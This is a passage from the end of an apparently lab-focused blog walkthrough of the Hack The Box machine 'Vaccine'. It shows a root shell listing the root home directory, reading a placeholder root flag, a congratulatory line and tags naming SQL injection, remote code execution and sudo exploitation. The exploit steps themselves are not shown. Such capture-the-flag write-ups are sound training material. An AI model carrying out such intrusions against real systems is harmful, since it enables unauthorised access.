</span></span><span class=line><span class=cl>drwx------  <span class=m>2</span> root root 4.0K Jul <span class=m>23</span>  <span class=m>2021</span> .cache
</span></span><span class=line><span class=cl>drwx------  <span class=m>3</span> root root 4.0K Jul <span class=m>23</span>  <span class=m>2021</span> .gnupg
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>3</span> root root 4.0K Jul <span class=m>23</span>  <span class=m>2021</span> .local
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root  <span class=m>148</span> Aug <span class=m>27</span>  <span class=m>2019</span> .profile
</span></span><span class=line><span class=cl>drwx------  <span class=m>2</span> root root 4.0K Jul <span class=m>23</span>  <span class=m>2021</span> .ssh
</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> root root  <span class=m>828</span> May <span class=m>18</span> 04:49 .viminfo
</span></span><span class=line><span class=cl>-rw-r-----  <span class=m>1</span> root root 4.6K Feb  <span class=m>4</span>  <span class=m>2020</span> pg_hba.conf
</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> root root   <span class=m>33</span> Feb <span class=m>25</span>  <span class=m>2020</span> root.txt
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>3</span> root root 4.0K Jul <span class=m>23</span>  <span class=m>2021</span> snap
</span></span><span class=line><span class=cl>root@vaccine:~# cat root.txt
</span></span><span class=line><span class=cl>&lt;flag&gt;
</span></span><span class=line><span class=cl>root@vaccine:~#
</span></span></code></pre></div><blockquote><p>flag</p></blockquote><p><strong>Congratulations</strong>, we just successfully <strong>pwned</strong> the <strong>target machine</strong>. All we have left to do now is to <strong>terminate</strong> the <strong>target</strong> box (if not terminated automatically) <strong>before</strong> we <strong>continue</strong> with the next box!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/vaccine/>vaccine</a></li><li><a href=https://bluewalle.github.io/tags/tier-2/>tier-2</a></li><li><a href=https://bluewalle.github.io/tags/free-tier/>free-tier</a></li><li><a href=https://bluewalle.github.io/tags/web/>web</a></li><li><a href=https://bluewalle.github.io/tags/network/>network</a></li><li><a href=https://bluewalle.github.io/tags/vulnerability-assessment/>vulnerability-assessment</a></li><li><a href=https://bluewalle.github.io/tags/databases/>databases</a></li><li><a href=https://bluewalle.github.io/tags/injection/>injection</a></li><li><a href=https://bluewalle.github.io/tags/custom-applications/>custom-applications</a></li><li><a href=https://bluewalle.github.io/tags/protocols/>protocols</a></li><li><a href=https://bluewalle.github.io/tags/source-code-analysis/>source-code-analysis</a></li><li><a href=https://bluewalle.github.io/tags/apache/>apache</a></li><li><a href=https://bluewalle.github.io/tags/postgresql/>postgresql</a></li><li><a href=https://bluewalle.github.io/tags/ftp/>ftp</a></li><li><a href=https://bluewalle.github.io/tags/php/>php</a></li><li><a href=https://bluewalle.github.io/tags/reconnaissance/>reconnaissance</a></li><li><a href=https://bluewalle.github.io/tags/password-cracking/>password-cracking</a></li><li><a href=https://bluewalle.github.io/tags/sudo-exploitation/>sudo-exploitation</a></li><li><a href=https://bluewalle.github.io/tags/sql-injection/>sql-injection</a></li><li><a href=https://bluewalle.github.io/tags/remote-code-execution/>remote-code-execution</a></li><li><a href=https://bluewalle.github.io/tags/clear-text-credentials/>clear-text-credentials</a></li><li><a href=https://bluewalle.github.io/tags/anonymous-access/>anonymous-access</a></li><li><a href=https://bluewalle.github.io/tags/guest-access/>guest-access</a></li><li><a href=https://bluewalle.github.io/tags/linux-target/>linux-target</a></li><li><a href=https://bluewalle.github.io/tags/easy-box/>easy-box</a></li><li><a href=https://bluewalle.github.io/tags/user-own/>user-own</a></li><li><a href=https://bluewalle.github.io/tags/system-own/>system-own</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>